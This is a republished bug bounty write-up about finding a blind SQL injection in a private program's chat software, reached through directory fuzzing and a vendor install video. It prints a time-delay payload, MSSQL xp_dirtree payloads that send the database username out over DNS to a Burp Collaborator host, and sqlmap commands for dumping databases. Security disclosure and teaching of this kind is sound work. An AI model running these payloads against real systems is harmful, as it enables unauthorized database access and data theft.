# :globe_with_meridians: How a YouTube Video lead to pwning a web application via SQL Injection worth $4324 bounty

> **Original Source:** [How a YouTube Video lead to pwning a web application via SQL Injection worth $4324 bounty](https://infosecwriteups.com/how-a-youtube-video-lead-to-pwning-a-web-application-via-sql-injection-worth-4324-bounty-285f0a9b9f6c)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# How a YouTube Video lead to pwning a web application via SQL Injection worth $4324 bounty


This write-up is regarding one of my findings on a private program on HackerOne. As this is a private program so I have made certain redactions to prevent disclosure of any sensitive information. This my first write-up so please overlook the mistakes.


So as I was invited to hack on this private program on HackerOne, I did some basic reconnaissance which included subdomain enumeration. After collecting subdomains using some open-source tools like AMASS etc, I started looking at each of them. In the process I stumbled upon a domain assume it to be `chat.example.com` .The landing page served default IIS Server landing page.


After encountering the default web-page there is always a chance that something may be present , so I went on to do content discovery via directory brute-forcing on the asset using my custom word-lists. I used `ffuf` for fuzzing the root `/` of web server and I got only a single directory in results assume it to be `/vendor-name`. Visiting the application at `https://chat.example.com/vendorname/`gave a 403 forbidden error


On encountering the error I fuzzed the `/vendor-name` directory which led me to another successful directory assume it to be`/software-name` and that too gave a 403 forbidden error. Fuzzing `/vendor-name/software-name/` endpoint gave multiple results like `/bin,/scripts,/logs,/styles` etc but nothing much interesting. `Logs `seemed to be very interesting but running wordlists fuzzing on these endpoints did not produce any juicy results. I tried various extensions `html,aspx,ashx,asp,bak,log` but none worked and it looked like a dead end to me.


*Photo by [Donald Giannatti](https://unsplash.com/@wizwow?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com/?utm_source=medium&utm_medium=referral)*


Then I went ahead to google the name of first two directories as they were looking like `/vendor-name/software-name` , so I googled `Vendor-Name Software-Name` and I got few results and information about the software that was installed on the server. It was a paid chatting/support software. After this I searched on GitHub etc. for directory structure of the application but nothing was available. After browsing multiple results and I found a YouTube video by the vendor explaining how to install and configure the application. As it was a demo regarding the software the instructor was demonstrating the ways to configure various config files so in the video the instructor opened the folders where the server was installed and as he went deep into the directories of the software I was able to map my findings with the directory structure of the software. Finally after copy-pasting various directories/files and creating wordlist from the video I found few forms with the help of the video, one of which was `https://chat.example.com/vendor-name/software-name/directory1/vulnerableform.html`.


After filling out the details and clicking on `Send`before the data was sent a prior GET request was made which looked something like `https://chat.example.com/vendor-name/software-name/_randomfiles.aspx?_param1=1&_returnURL=%2Fexample.html `This looked interesting , so I tried to look at the request and response. The response contained a HTML redirect to the path mention in `_returnURL` so I tried to give `https://evil.com`in the `_returnURL`and response contained a HTML redirect to `https://evil.com` but as usual Open Redirect was out of scope. I tried to inject `javascript:alert(1)` in the URL but it was properly encoded. After this I tried to take a look at the other parameter for SQL Injection vulnerability and changing its value made no effect on the response so error based SQLI was not possible, so I thought to try out some basic BlindSQLI payloads on the parameter. After trying out some conditional BlindSQLI payloads to induce some difference in response or some error and failing at it, I tried to inject some BlindSQLI payloads to trigger time delays. As it was an Microsoft server so most probably the back-end database will be Microsoft SQL Server which supports batched queries,I tried to induce some delay in response using unconditional time delay with the most basic payload on the parameter i.e `waitfor delay'0:0:20'--`and to my surprise the injection was successful and there was a delay of 20 seconds in the response. There are various ways to exploit Blind SQL Injection like triggering conditional responses and out of band exploitation. Most common way is to may application trigger out of band interaction to a system which we control. Most common way is to use DNS (Domain Name Service) protocol as almost every organization allows outgoing DNS queries which was the case in this scenario too.


After this it was all about googling the stuff. At first to confirm the vulnerability, I used “xp_dirtree” a stored procedure that will try to list the contents of the directory or network share its given in its first argument. If the listing is a Network Share it will do a DNS LookUp for it and if we get a callback we can confirm that OOB extraction of data is possible.


PingBack Payload


## Get Vishal Saini’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


`;declare @q varchar(99);set @q=’\\[YOU_BURP_COLLAB_SUBDOMAIN_PART_HERE].burpcollab’+’orator.net\ogy’; exec master.dbo.xp_dirtree @q; —`


Username Extraction Payload


`;declare @q varchar(99);set @q=’\\[YOU_BURP_COLLAB_SUBDOMAIN_PART_HERE]’+(SELECT user_name())+’.burpcollab’+’orator.net\ogy’; exec master.dbo.xp_dirtree @q; —`


But , there’s limitation on number of characters that can be extracted manually. If the result of query is less 253 including the burp collaborator domain then only the data extraction will be possible, but this is enough for the report to be triaged, but for further exploitation I used SQLMAP which can easily provide us data we want in our POC.


- Injection confirmation


`python3 sqlmap.py -u https://chat.example.com/vendorname/softwarename/_randomfiles.aspx?param1=1`


2. Fetching Databases


`python3 sqlmap.py -u https://chat.example.com/vendorname/softwarename/_randomfiles.aspx?param1=1 — dbs`


After this I created the report with all the information and submitted it to the program and before the HackerOne Triager could validate the finding the asset was taken down by the program for mitigation but HackerOne Triager confirmed this with the program and triaged the report with `Critical [9.3] `severity. After the mitigation the application was up and running safely.


After the vulnerability was resolved , I was awarded a bounty of $4324 by the program :)


If you found the blog interesting do share it and if you have any questions you can DM me on twitter at [https://twitter.com/k4k4r07](https://twitter.com/k4k4r07) . Thanks for reading :)

---

*Originally published on [Medium](https://infosecwriteups.com/how-a-youtube-video-lead-to-pwning-a-web-application-via-sql-injection-worth-4324-bounty-285f0a9b9f6c). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
